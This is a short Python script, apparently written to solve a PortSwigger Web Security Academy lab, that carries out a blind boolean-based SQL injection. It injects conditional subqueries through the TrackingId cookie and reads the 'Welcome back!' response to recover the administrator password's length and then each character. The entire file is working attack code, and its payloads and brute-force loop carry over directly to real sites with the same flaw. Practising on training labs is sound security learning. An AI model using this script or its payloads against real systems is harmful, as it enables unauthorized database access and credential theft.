#!/usr/bin/python3

from pwn import *

import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n Saliendo...\n")
    sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a5a00a503dc786ab77e7e73004b0028.web-security-academy.net/"
tracking_id = "FmG1ydUVGLNtBRre"
session = "FmG1ydUVGLNtBRre"
characters = string.ascii_lowercase + string.digits

def password_lenght_request():
    counter = 0
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque longitud contraseña...")
    p2 = log.progress('Longitud Contraseña')
    while True:
            cookies = {
                'TrackingId': f"{tracking_id}'and (select 'a' from users where username = 'administrator' and length(password) > {counter}) = 'a",
                'session': f'{session}'
            }
            p1.status(cookies['TrackingId'])
            r = requests.get(main_url, cookies=cookies)
            p2.status(counter)
            if 'Welcome back!' in r.text:
                counter += 1
            else:
                break
    p2.success(counter)
    return counter

def make_request(longitudContraseña):
    password = ''
    p1 = log.progress("Fuerza bruta")
    p1.status('Iniciando el ataque de fuerza bruta')

    time.sleep(2)

    p2 = log.progress('Password')
    for position in range(1, longitudContraseña + 1):
        for character in characters:
            cookies = {
                'TrackingId': f"{tracking_id}'and (select substring(password, {position}, 1) from users where username = 'administrator') = '{character}",
                'session': f'{session}'
            }
            p1.status(cookies['TrackingId'])
            p2.status(password)
            r = requests.get(main_url, cookies=cookies)
            if 'Welcome back!' in r.text:
                password += character
                p2.status(password)
                break


if __name__ == "__main__":
    longitud_contraseña = password_lenght_request()
    make_request(longitud_contraseña)
